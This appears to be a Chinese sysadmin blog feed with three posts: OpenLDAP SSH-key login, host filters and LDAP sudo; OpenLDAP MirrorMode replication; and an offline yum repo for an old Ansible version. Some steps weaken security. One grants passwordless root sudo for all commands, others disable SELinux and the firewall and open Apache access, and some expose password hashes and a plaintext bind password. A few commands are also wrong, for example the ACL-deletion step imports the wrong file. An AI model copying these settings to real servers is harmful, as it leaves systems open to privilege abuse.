demopassword-bash-4.2$ id 800001uid=3000(800001) gid=100(users) groups=100(users),80001(ops)-bash-4.2$ # 这里可以看到没有配置自动生成账户的家目录，在实际的运维过程中，也不会去生成家目录（不然一堆的账户加目录），而是让运维账户统一一个家目录，并且设置为只读。# 不过如果有需要配置配置家目录自动生成，需要修改pam模块 配置LDAP使用公钥(publicKey)远程ssh登录客户主机openldap服务端配置123456789101112131415161718192021222324# 安装openssh-ldapyum install openssh-ldap# 查看rpm -aql |grep openssh-ldap/usr/share/doc/openssh-ldap-7.4p1/usr/share/doc/openssh-ldap-7.4p1/HOWTO.ldap-keys/usr/share/doc/openssh-ldap-7.4p1/ldap.conf/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.ldif/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.schema/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-sun.ldif/usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-sun.schema# 配置添加相关schemacp /usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.ldif /etc/openldap/schema/cp /usr/share/doc/openssh-ldap-7.4p1/openssh-lpk-openldap.schema /etc/openldap/schema/# 添加ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/openssh-lpk-openldap.ldif# 账户添加objectClass: ldapPublicKey 并添加属性sshPublicKey# 具体修改流程，可以使用下面安装的ldapadmin或者phpldapadmin进行配置objectClass: ldapPublicKeysshPublicKey: 值是具体的publickey 客户主机配置123456789101112131415# 安装yum install openssh-ldapcp /usr/share/doc/openssh-ldap-7.4p1/ldap.conf /etc/ssh/# 如果使用TLS 配置TLS,这里不使用vim /etc/ssh/ldap.confssl nouri ldap://10.116.72.11/vim /etc/ssh/sshd_config# 脚本将从LDAP获取密钥并将其提供给SSH服务器AuthorizedKeysCommand /usr/libexec/openssh/ssh-ldap-wrapperAuthorizedKeysCommandUser nobodyPubkeyAuthentication yes 登录验证1234ssh -i ~/.ssh/id_rsa 800001@10.116.72.15Last login: Thu Jul 4 16:15:30 2019 from 10.116.71.200Could not chdir to home directory /home/demo: No such file or directory-bash-4.2$ 配置LDAP账户可以登录的主机列表测试使用的远程ssh服务器是10.116.72.15，我们验证如下 添加账户主机列表（host属性）不包含116.116.72.15 测试是否可以正常登录 添加账户主机列表（host属性）包含116.116.72.15 测试是否可以正常登录 需要通过Ldap远程登录的客户机配置123vi /etc/nsswitch.conf# 添加如下过滤配置，包含本机主机名称。表示过滤匹配包括本机IP或者允许任意IP地址的账户授权信息filter passwd (|(host=10.116.72.15)(host=\*))(host=ALL) 备注：如果远程主机是centos6，配置稍有不同 12vi /etc/pam_ldap.confpam_filter |(host=10.116.72.16)(host=\*)(host=ALL) LDAP账户配置ldap命令或者ldapadmin管理工具为账户添加属性host，这个属性可以添加多次。 第一次配置不包含测试主机10.116.72.15 123456789101112131415161718192021222324ldapsearch -x uid=800001 -b 'ou=People,dc=example,dc=com'dn: uid=800001,ou=People,dc=example,dc=comobjectClass: topobjectClass: accountobjectClass: posixAccountobjectClass: shadowAccountcn: demouid: 800001uidNumber: 3000gidNumber: 100homeDirectory: /home/demologinShell: /bin/bashgecos: Demo [Admin (at) eju]shadowMin: 0shadowMax: 99999shadowWarning: 7host: 10.116.72.12host: 10.116.72.16测试登录# ssh 800001@10.116.72.15800001@10.116.72.15's password: Permission denied, please try again. 第二次配置包含测试主机10.116.72.15 123456789101112131415161718192021222324252627ldapsearch -x uid=800001 -b 'ou=People,dc=example,dc=com'dn: uid=800001,ou=People,dc=example,dc=comobjectClass: topobjectClass: accountobjectClass: posixAccountobjectClass: shadowAccountcn: demouid: 800001uidNumber: 3000gidNumber: 100homeDirectory: /home/demologinShell: /bin/bashgecos: Demo [Admin (at) eju]shadowMin: 0shadowMax: 99999shadowWarning: 7host: 10.116.72.12host: 10.116.72.15host: 10.116.72.16测试登录# ssh 800001@10.116.72.15800001@10.116.72.15's password: Last login: Thu Jul 4 16:15:30 2019 from 10.116.71.200Could not chdir to home directory /home/demo: No such file or directory-bash-4.2$ 以上，测试通过。 配置LDAP sudo权限管理服务配置CentOS7.6下安装的OpenLDAP是2.4.44 ,schema目录下并没有sudo.ldif以及sudo.schema文件，需要单独处理。 sudo是默认安装的，sudo相关目录下有sudo.schema模板文件schema.OpenLDAP 123456789101112131415161718192021222324252627282930find / -name schema.OpenLDAP -exec cp &#123;&#125; /etc/openldap/schema/sudo.schema \;# 生成sudo.ldifecho 'include /etc/openldap/schema/sudo.schema' &gt; /tmp/sudo.confmkdir /tmp/sudoslaptest -f /tmp/sudo.conf -F /tmp/sudovim /tmp/sudo/cn=config/cn=schema/cn=&#123;0&#125;sudo.ldif替换（前3行）dn: cn=&#123;0&#125;sudoobjectClass: olcSchemaConfigcn: &#123;0&#125;sudo为dn: cn=sudo,cn=schema,cn=configobjectClass: olcSchemaConfigcn: sudo删除(最后7行)structuralObjectClass: olcSchemaConfigentryUUID: ec3b659a-31a9-1039-90ae-87c69280e4a2creatorsName: cn=configcreateTimestamp: 20190703064542ZentryCSN: 20190703064542.945991Z#000000#000#000000modifiersName: cn=configmodifyTimestamp: 20190703064542Zcp /tmp/sudo/cn=config/cn=schema/cn=&#123;0&#125;sudo.ldif /etc/openldap/schema/sudo.ldifldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/sudo.ldifrm -f /tmp/sudo.conf /tmp/sudo 权限配置123456789101112131415161718192021222324vim SUODers.ldifdn: ou=SUDOers,dc=example,dc=comou: SUDOersobjectClass: topobjectClass: organizationalUnitdn: cn=defaults,ou=SUDOers,dc=example,dc=comobjectClass: sudoRolecn: defaultssudoOption: requirettysudoOption: !visiblepwsudoOption: always_set_homesudoOption: env_resetsudoOption: env_keep = "COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"sudoOption: env_keep += "MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"sudoOption: env_keep += "LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"sudoOption: env_keep += "LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"sudoOption: env_keep += "LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"sudoOption: secure_path = /sbin:/bin:/usr/sbin:/usr/binsudoOption: logfile = /var/log/sudo# 添加ldapadd -x -W -D "cn=Manager,dc=example,dc=com" -f SUODers.ldif 将上面的demo（800001）账户配置为sudo权限这里配置一个运维sudo role，名称为sudo_ops_role，简单配置为sudo 到root所有权限，并将800001加入该role 12345678910111213vim sudo_ops_role.ldifdn: cn=sudo_ops_role,ou=SUDOers,dc=example,dc=comobjectClass: sudoRolecn: sudo_ops_rolesudoOption: !authenticatesudoRunAsUser: rootsudoCommand: ALLsudoHost: ALLsudoUser: 800001# 添加ldapadd -x -W -D "cn=Manager,dc=example,dc=com" -f sudo_ops_role.ldif 客户端增加如下配置123456789vim /etc/nsswitch.conf# 追加内存sudoers: files ldapmv /etc/sudo-ldap.conf&#123;,.bak&#125;vi /etc/sudo-ldap.confuri ldap://10.116.72.11/ base dc=example,dc=comsudoers_base ou=SUDOers,dc=example,dc=com 测试 123456# ssh 800001@10.116.72.15800001@10.116.72.15's password: Could not chdir to home directory /home/ldapusers: No such file or directory-bash-4.2$ sudo su -Last login: Wed Jul 3 15:09:21 CST 2019 from 10.116.71.200 on pts/0[root@systerm-shylf-1 ~]# 基于web的OpenLDAP管理工具phpldapadmin实例在openldap安装，实际使用中可以部署在其他服务器上通过网络访问。前端还可以配置一个nginx去代理实现高可用 安装配置phpldapadmin1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 安装组件yum -y install epel-releaseyum -y install httpd phpldapadmin# yum安装后的项目文件位置/usr/share/phpldapadmin/htdocs，配置文件位置/etc/phpldapadmin/config.php# phpldapadmin修改vim /etc/phpldapadmin/config.php# 注释掉//$servers-&gt;setValue('login','attr','uid');# 或者修改为$servers-&gt;setValue('login','attr','dn');$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','LDAP Server'); $servers-&gt;setValue('server','host','127.0.0.1'); //根据需要修改为实际地址,这个部署到openldap本机直接保留127.0.0.1$servers-&gt;setValue('server','port',389);$servers-&gt;setValue('server','base',array('dc=example,dc=com')); //$servers-&gt;setValue('login','auth_type','cookie');$servers-&gt;setValue('login','bind_id','cn=Manager,dc=example,dc=com');$servers-&gt;setValue('login','bind_pass','');$servers-&gt;setValue('server','tls',false);# httpd修改vim /etc/httpd/conf.d/phpldapadmin.confAlias /phpldapadmin /usr/share/phpldapadmin/htdocsAlias /ldapadmin /usr/share/phpldapadmin/htdocs&lt;Directory /usr/share/phpldapadmin/htdocs&gt; &lt;IfModule mod_authz_core.c&gt; # Apache 2.4 # Require local Require all granted &lt;/IfModule&gt; &lt;IfModule !mod_authz_core.c&gt; # Apache 2.2 Order Deny,Allow Deny from all Allow from 127.0.0.1 Allow from ::1 # 根据需要配置许可 Allow from 10.116 &lt;/IfModule&gt;&lt;/Directory&gt;# 启动httpd服务systemctl restart httpd 使用phpldapadmin 备注，如果报错如下 1234567891011121314151617Forbidden You don't have permission to access /ldapadmin/ on this server.可以尝试修改httpd.confvi /etc/httpd/conf/http.conf修改&lt;Directory /&gt; AllowOverride none Require all denied&lt;/Directory&gt;为&lt;Directory /&gt; Options Indexes FollowSymLinks AllowOverride None &lt;/Directory&gt;systemctl restart httpd 为phpldapadmin添加suorole配置模版从官网地址 可以获取到sudoRole模板，可以在这个基础上进行修改 123456ll /usr/share/phpldapadmin/templates# ll /usr/share/phpldapadmin/templatestotal 8drwxr-xr-x 2 root root 4096 Jul 4 15:32 creationdrwxr-xr-x 2 root root 69 Jul 4 15:31 modification-rw-r--r-- 1 root root 2089 Oct 1 2012 template.dtd vim /usr/share/phpldapadmin/templates/creation/sudo.xml 注意根据需要进行修改，我的sudo ou名称是SUDOers 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;&lt;!DOCTYPE template SYSTEM "template.dtd"&gt;&lt;template&gt;&lt;title&gt;Sudo Policy&lt;/title&gt;&lt;regexp&gt;^ou=SUDOers,dc=.*&lt;/regexp&gt;&lt;icon&gt;images/door.png&lt;/icon&gt;&lt;description&gt;New Sudo Policy&lt;/description&gt;&lt;askcontainer&gt;1&lt;/askcontainer&gt;&lt;rdn&gt;cn&lt;/rdn&gt;&lt;visible&gt;1&lt;/visible&gt;&lt;objectClasses&gt;&lt;objectClass id="sudoRole"&gt;&lt;/objectClass&gt;&lt;/objectClasses&gt;&lt;attributes&gt;&lt;attribute id="cn"&gt; &lt;display&gt;Policy Name&lt;/display&gt; &lt;order&gt;1&lt;/order&gt; &lt;page&gt;1&lt;/page&gt;&lt;/attribute&gt;&lt;attribute id="sudoOption"&gt; &lt;display&gt;Sudo Option&lt;/display&gt; &lt;order&gt;2&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoRunAsUser"&gt; &lt;display&gt;Sudo Run As User&lt;/display&gt; &lt;order&gt;3&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoCommand"&gt; &lt;display&gt;Sudo Command&lt;/display&gt; &lt;order&gt;4&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoUser"&gt; &lt;display&gt;Sudo Users&lt;/display&gt; &lt;option&gt;=php.MultiList(/,(objectClass=posixAccount),uid,%uid%(%cn%),sudoUser)&lt;/option&gt; &lt;order&gt;5&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoHost"&gt; &lt;display&gt;Sudo Hosts&lt;/display&gt; &lt;array&gt;10&lt;/array&gt; &lt;order&gt;6&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="description"&gt; &lt;type&gt;textarea&lt;/type&gt; &lt;display&gt;Description&lt;/display&gt; &lt;order&gt;7&lt;/order&gt; &lt;page&gt;1&lt;/page&gt;&lt;/attribute&gt;&lt;/attributes&gt;&lt;/template&gt; vim /usr/share/phpldapadmin/templates/modification/sudo.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;&lt;!DOCTYPE template SYSTEM "template.dtd"&gt;&lt;template&gt;&lt;title&gt;Sudo Policy&lt;/title&gt;&lt;regexp&gt;^cn=.*,ou=SUDOers,dc=.*&lt;/regexp&gt;&lt;icon&gt;images/door.png&lt;/icon&gt;&lt;description&gt;Sudo Policy&lt;/description&gt;&lt;askcontainer&gt;1&lt;/askcontainer&gt;&lt;rdn&gt;cn&lt;/rdn&gt;&lt;visible&gt;1&lt;/visible&gt;&lt;objectClasses&gt;&lt;objectClass id="sudoRole"&gt;&lt;/objectClass&gt;&lt;/objectClasses&gt;&lt;attributes&gt;&lt;attribute id="cn"&gt; &lt;display&gt;Policy Name&lt;/display&gt; &lt;order&gt;1&lt;/order&gt; &lt;page&gt;1&lt;/page&gt;&lt;/attribute&gt;&lt;attribute id="sudoOption"&gt; &lt;display&gt;Sudo Option&lt;/display&gt; &lt;order&gt;2&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoRunAsUser"&gt; &lt;display&gt;Sudo Run As User&lt;/display&gt; &lt;order&gt;3&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoCommand"&gt; &lt;display&gt;Sudo Command&lt;/display&gt; &lt;order&gt;4&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoUser"&gt; &lt;display&gt;Sudo Users&lt;/display&gt; &lt;order&gt;5&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="sudoHost"&gt; &lt;display&gt;Sudo Hosts&lt;/display&gt; &lt;!-- &lt;array&gt;10&lt;/array&gt; --&gt; &lt;order&gt;6&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;spacer&gt;1&lt;/spacer&gt;&lt;/attribute&gt;&lt;attribute id="description"&gt; &lt;type&gt;textarea&lt;/type&gt; &lt;display&gt;Description&lt;/display&gt; &lt;order&gt;7&lt;/order&gt; &lt;page&gt;1&lt;/page&gt; &lt;cols&gt;200&lt;/cols&gt; &lt;rows&gt;10&lt;/rows&gt;&lt;/attribute&gt;&lt;/attributes&gt;&lt;/template&gt; 重启httpd服务 1systemctl restart httpd 浏览器查看(ou=SUODers,dc=example,dc=com 创建一条子目录 sudoRole) windows下的一个OpenLDAP管理工具 LdapAdmin下载地址 LdapAdmin, 当前最新版本是1.8.3。 下载后直接解压就是一个exe文件。 创建连接到openldap服务 配置一个运维组ops，然后将用户800001加入到ops组 开启memberOf默认情况下openldap的用户组属性是Posixgroup，Posixgroup用户组属性和用户没有实际的对应关系。如果要对应起来的话，就需要单独把用户设置到Posixgroup中 开启memberOf之后可以配置groupOfUniqueNames用户组属性，可以根据用户组过滤用户，这个过滤是唯一的 开启memberof，并让新增用户支持memberof 创建 memberof_config.ldif 123456789101112131415161718dn: cn=module&#123;0&#125;,cn=configcn: modulle&#123;0&#125;objectClass: olcModuleListobjectclass: topolcModuleload: memberof.laolcModulePath: /usr/lib64/openldapdn: olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcConfigobjectClass: olcMemberOfobjectClass: olcOverlayConfigobjectClass: topolcOverlay: memberofolcMemberOfDangling: ignoreolcMemberOfRefInt: TRUEolcMemberOfGroupOC: groupOfNamesolcMemberOfMemberAD: memberolcMemberOfMemberOfAD: memberOf 创建 refint1.ldif 123dn: cn=module&#123;0&#125;,cn=configadd: olcmoduleloadolcmoduleload: refint 创建 refint2.ldif 1234567dn: olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcConfigobjectClass: olcOverlayConfigobjectClass: olcRefintConfigobjectClass: topolcOverlay: refintolcRefintAttribute: memberof member manager owner 导入配置 1234ldapadd -Q -Y EXTERNAL -H ldapi:/// -f memberof_config.ldifldapmodify -Q -Y EXTERNAL -H ldapi:/// -f refint1.ldifldapadd -Q -Y EXTERNAL -H ldapi:/// -f refint2.ldif# 导入refint2时如果有报错，把最后一句改为：olcRefintAttribute: memberof uniqueMember manager owner 验证一下配置，这个命令可以列出所有配置 1slapcat -b cn=config 禁止匿名访问默认情况下匿名用户可以获取所有用户信息，甚至是密码字段，虽然密码字段是经过加密的那也很危险 创建disable_anon.ldif文件 1234567891011121314dn: cn=configchangetype: modifyadd: olcDisallowsolcDisallows: bind_anondn: cn=configchangetype: modifyadd: olcRequiresolcRequires: authcdn: olcDatabase=&#123;-1&#125;frontend,cn=configchangetype: modifyadd: olcRequiresolcRequires: authc 导入配置 1ldapadd -Q -Y EXTERNAL -H ldapi:/// -f disable_anon.ldif 设置ACL拒绝所有用户查看用户信息，并且添加有ldap管理账号 创建acl.ldif 123456789101112dn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcAccessolcAccess: to attrs=userPassword by anonymous auth by dn.base=&quot;cn=ldapadmin,ou=manage,dc=taovip,dc=com&quot; write by * noneolcAccess: to * by anonymous auth by dn.base=&quot;cn=ldapadmin,ou=manage,dc=taovip,dc=com&quot; write by dn.base=&quot;cn=ldapread,ou=manage,dc=taovip,dc=com&quot; read by * none 导入配置 1ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f acl.ldif 删除ACL 创建文件del_acl.ldif 1234dn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifydelete: olcAccessolcAccess: &#123;0&#125; 导入配置 1ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f acl.ldif 创建管理用户创建add_ou.ldif 12345dn: ou=manage,dc=example,dc=comou: managedescription: Directory ManageobjectClass: topobjectClass: organizationalUnit 创建add_manage_user.ldif 123456789101112131415161718192021n: cn=ldapadmin,ou=manage,dc=example,dc=comcn: ldapadminsn: ldapadminuid: ldapadminobjectClass: topobjectClass: shadowAccountobjectClass: inetOrgPersonobjectClass: organizationalPersonobjectClass: personuserPassword: &#123;SSHA&#125;4eDZHnxvfOOoAgSM6tDLDueCIUB9sRuDHVpVJdn: cn=ldapread,ou=manage,dc=example,dc=comcn: ldapreadsn: ldapreaduid: ldapreadobjectClass: topobjectClass: shadowAccountobjectClass: inetOrgPersonobjectClass: organizationalPersonobjectClass: personuserPassword: &#123;SSHA&#125;4eDZHnxvfOOoAgSM6tDLDueCIUB9sRuDHVpVJ 导入配置 12ldapadd -x -D cn=root,dc=example,dc=com -W -f add_ou.ldifldapadd -x -D cn=root,dc=example,dc=com -W -f add_manage_user.ldif]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于OpenLDAP_MirrorMode的OpenLDAP高可用]]></title>
    <url>%2Farticles%2F1c70a485.html</url>
    <content type="text"><![CDATA[背景LDAP是一款轻量级目录访问协议（Lightweight Directory Access Protocol，简称LDAP），属于开源集中账号管理架构的实现，且支持众多系统版本，被广大互联网公司所采用。目录服务是一种特殊的数据库系统，对于数据的读取、浏览、搜索有很好的效果。同时做为用户中心，数据库的高可用显得尤为重要。在客户生产环境中使用的是客户的负载均衡设备，基于思杰的硬件负载均衡设备，后端配置的是OpenLDAP_MirrorMode,相当于Mysql的双主模式，后面某一台服务器出现问题，负载均衡会将后端的服务器剔除，另一台仍能提供服务，如下图所示 实验环境：操作系统: centos 7.2服务器A：10.10.1.134服务器B：10.10.1.132 环境准备 下载软件： 1234mkdir /home/admin/openldap &amp;&amp; cd /home/admin/openldapwget ftp://ftp.openldap.org/pub/OpenLDAP/openldap- release/openldap-2.4.23.tgzwget http://download.oracle.com/berkeley-db/db-4.6.21.tar.gz 关闭selinux 1sed -i '/SELINUX/s/enforcing/disabled/' /etc/selinux/config &amp;&amp; sestatus 防火墙关闭 1/bin/systemctl disable firewalld.service &amp;&amp; /bin/systemctl stop firewalld.service 配置yum源为阿里云yum源 12345678#从阿里云镜像网站下载yum源配置文件到yum目录中wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo #修改版本号为redhat7sed -i 's/$releasever/7/g' /etc/yum.repos.d/CentOS-Base.repo#清空yum缓存yum clean all#生成列表yum list 安装openldap环境所需要的依赖包。 1yum -y install libtool-ltdl libtool-ltdl-devel gcc openssl openssl-devel cyrus-sasl-lib.x86_64 cyrus-sasl-devel.x86_64 cyrus-sasl-plain.x86_64 cyrus-sasl-md5.x86_64 cyrus-sasl-ldap.x86_64 安装openldap和Berkeley DB1. 写在安装之前：编译安装openldap需要数据库的支持，openldap的数据库支持Berkeley DB,Oracle,Mysql,MariaDB,GDBM等数据库。默认openldap采用Berkeley DB，并且openldap对数据库有一定的要求，openldap 2.4的软件为例，需要Berkeley DB 4.4版本以上,所以在编译安装openldap源码包时需要先下载安装Berkeley DB 2. 编译安装Berkeley DB1234567tar -xf db-4.6.21.tar.gz -C /usr/local/srccd /usr/local/src/db-4.6.21/build_unix/ &amp;&amp; mkdir /usr/local/BDB../dist/configure --prefix=/usr/local/BDBmake &amp;&amp; make installecho "/usr/local/BDB/lib/" &gt; /etc/ld.so.conf.d/bdb.confldconfig -vln -sv /usr/local/BDB/include /usr/include/BDB 3. 编译安装openldap12345678910tar -xf openldap-2.4.23.tgz -C /usr/local/src/cd /usr/local/src/openldap-2.4.23/./configure --prefix=/usr/local/openldap --enable-syslog --enable-modules --enable-debug --with-tls CPPFLAGS=-I/usr/local/BDB/include/ LDFLAGS=-L/usr/local/BDB/lib/ --enable-ldap --enable-relay --enable-accesslog --enable-auditlog --enable-syncprov --with-cyrus-sasl --enable-spasswdmake dependmake &amp;&amp; make installecho "/usr/local/openldap/lib/" &gt; /etc/ld.so.conf.d/ldap.confldconfig -vln -sv /usr/local/openldap/include/ /usr/include/ldapln -s /usr/local/openldap/bin/* /usr/local/bin/ln -s /usr/local/openldap/sbin/* /usr/local/sbin/ 配置openldap1. 配置openldap的方法有两种： 通过修改配置文件实现配置 通过配置数据库的形式完成配置（slapd.d下的数据库配置文件）,属于动态配置不需要重启slapd进程,此配置文件在cn=config目录下的LDIF的配置文件 。此文件不建议手动修改，用ldap命令生成。 2. 配置rootdn密码(optional)1/usr/local/openldap/bin/slappasswd #此密码记住，后面配置openldap会用到。 3. 创建用户ldap1useradd ldap 4. 创建数据目录以及日志文件123mkdir /data/openldap/&#123;data,log,var&#125; -pcd /data/openldap/var/mkdir run 5. 修改权限：123cp /usr/local/openldap/etc/openldap/DB_CONFIG.example /data/openldap/data/DB_CONFIGchown -R ldap:ldap /data/openldap/datachmod 700 -R /data/openldap/data 6. 修改openldap配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344#编辑配置文件vim slapd.confinclude /usr/local/openldap/etc/openldap/schema/core.schemainclude /usr/local/openldap/etc/openldap/schema/collective.schemainclude /usr/local/openldap/etc/openldap/schema/corba.schemainclude /usr/local/openldap/etc/openldap/schema/cosine.schemainclude /usr/local/openldap/etc/openldap/schema/duaconf.schemainclude /usr/local/openldap/etc/openldap/schema/dyngroup.schemainclude /usr/local/openldap/etc/openldap/schema/inetorgperson.schemainclude /usr/local/openldap/etc/openldap/schema/java.schemainclude /usr/local/openldap/etc/openldap/schema/misc.schemainclude /usr/local/openldap/etc/openldap/schema/nis.schemainclude /usr/local/openldap/etc/openldap/schema/openldap.schemainclude /usr/local/openldap/etc/openldap/schema/ppolicy.schemapidfile /data/openldap/var/run/slapd.pidargsfile /data/openldap/var/run/slapd.argsloglevel 256logfile /data/openldap/log/slapd.logmoduleload syncprov.la # 需要数据同步需要开启此模块database bdbdirectory /data/openldap/datasuffix "dc=boe,dc=com"rootdn "cn=Manager,dc=boe,dc=com"rootpw &#123;SSHA&#125;eJtr5umAo23PqTKATU/X6D8swJ9yIlSx #用slappasswd命令生成的密码index objectclass,entryCSN,entryUUID eqoverlay syncprovsyncprov-checkpoint 100 10syncprov-sessionlog 100serverID 2syncrepl rid=123provider=ldap://对端服务器ipbindmethod=simplebinddn="cn=Manager,dc=boe,dc=com"credentials=密码(管理员密码，这里是Manager的密码)searchbase="dc=boe,dc=com"schemachecking=offtype=refreshAndPersistretry="60 +"mirrormode on#两个服务器的配置文件有两个地方不一致1）serverID不一致 2）provider=ldap://对端的ip 7.开启日志功能 通过修改配置文件开启日志功能 12345/etc/rsyslog.d/slapd.conflocal4.* /data/openldap/log/openldap.log#重启rsyslog和slapdservice rsyslog restart 通过修改数据库配置文件开启 123456789/root/loglevel.ldif &lt;&lt; EOFdn: cn=configchangetype: modifyreplace: olcLogLevelolcLogLevel: statsEOF#导入ldapadd -x -D "cn=Manager,dc=boe,dc=com" -f ./loglevel.ldif -w secret 配置phpldpadmin工具1. 安装和配置LDAP管理工具PHPldapadmin123yum -y install httpd php php-ldap php-gd php-mbstring php-pear php-bcmath php-xmlyum -y install epel-releaseyum --enablerepo=epel -y install phpldapadmin 2. 修改配置文件123456789101112vim /etc/phpldapadmin/config.php +398#397行取消注释，398行添加注释$servers-&gt;setValue('login','attr','dn');vim /etc/httpd/密码 d/phpldapadmin.confApache 2.4Require all granted （修改此处)Order Deny,AllowDeny from allAllow from 127.0.0.1Allow from ::1 3. 设置开机自启并启动Apache123456systemctl enable httpdsystemctl start httpd #启动openldap#/usr/local/openldap/libexec/slapd访问用http://ip/phpldapadmin访问如图 在10.10.1.132上创建了一个OU名为testou,会发现10.10.1.132会自动同步到本地，如图:两服务器日志如下：以上结果得知，在镜像模式下，当其中一台服务器增加操作OU时，另一台也会同步增加，两台服务器均可进行读写操作，任何一台信息发生变化，都会以推的方式进行通知。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自制yum源离线安装开发代码时的对应版本ansible]]></title>
    <url>%2Farticles%2Ffe96187b.html</url>
    <content type="text"><![CDATA[背景由于在工作环境中，经常遇到批量安装的服务器，不具备连接互联网的条件。同时通过简单的下载安装 ansible 源码安装，又会遇到各种奇葩问题，推荐使用自制 yum 源方法，然后使用 yum安装 ansible。不得不说，ansible很好用，ansible团队也一致在维护和更新。但是，版本之间存在比较大的差异。以前写的代码，现在直接安装新版本的ansible后可能就不能用了，你想想下：代码中用到的类没有了，模块消失了，变量不见了等等，当然可以查看新的文档更改代码适应新版本，但是代码沉淀时间久了，做迁移还是会遇到这种问题，这个问题困扰了很多Devops。如何安装写代码时的版本，如何在断网模式下安装代码对应版本的ansible, 这成为了一种刚需和痛点，本文就以安装旧版本：2.3.1为例，详细阐述。 环境操作系统版本：Centos7.2 Python版本： Python2.7.5 操作步骤旧代码机器操作安装 yumdownloader准备一台可以连接互联网的相同版本系统的操作系统(安装环境一样)，使用yumdownloader工具下载ansible安装包以及所有依赖包。并以 root 身份安装 yumdownloader工具： 1yum -y install yum-utils 创建文件夹用于存放依赖的安装包 1mkdir /root/packages 更新国内yum源由于默认的源里没有 ansible，需要安装国内快速稳定的yum源, 这里选择阿里源： 12345mv /etc/yum.repos.d/epel-7.repo /etc/yum.repos.d/epel-7.repo.bakwget -O /etc/yum.repos.d/epel-7.repo http://mirrors.aliyun.com/repo/epel-7.repo yum clean all # 清除系统所有的yum缓存yum makecache # 生成yum缓存yum update 下载 ansible 和 所有依赖包1234567#下载ansible依赖包yumdownloader --resolve --destdir /root/packages ansible#下载createrepo依赖包yumdownloader --resolve --destdir /root/packages createrepo# 压缩安装包tar -Jcvf packages.tar.xz packages 新机器操作将上面下载的所有 rpm 安装包打包，传输到需要批量的新服务器上，并解压到指定的文件夹里面 12345# 新机器解压到/mnt/下tar -Jxvf packages.tar.xz -C /mnt/链接：https://pan.baidu.com/s/1FtZxpXk1AzZ_WcGVJFGE5w提取码：0sf2 首先创建 安装createrepo进入 /mnt/packages 目录中 123rpm -ivh deltarpm-3.6-3.el7.x86_64.rpmrpm -ivh python-deltarpm-3.6-3.el7.x86_64.rpmrpm -ivh createrepo-0.9.9-28.el7.noarch.rpm 然后使用createrepo生成符合要求的yum仓库12345678910# cd /mnt# createrepo /packagesSpawning worker 0 with 25 pkgsWorkers FinishedSaving Primary metadataSaving file lists metadataSaving other metadataGenerating sqlite DBsSqlite DBs complete 配置本地 yum源把当前存在 yum 做备份，并移走别的目录 12345678910# vim /etc/yum.repos.d/ansible.repo[ansibel]name=sun local ansiblebaseurl=file:///mnt/packagesenabled=1gpgcheck=0保存退出，然后执行：yum clean allyum makecache 使用 yum安装 ansible1yum -y install ansible 验证安装成功：12345# ansible --versionansible 2.3.1.0 config file = /etc/ansible/ansible.cfg configured module search path = Default w/o overrides python version = 2.7.5 (default, Jun 20 2019, 20:27:34) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] 参考：https://www.jianshu.com/p/9a34d458de29]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
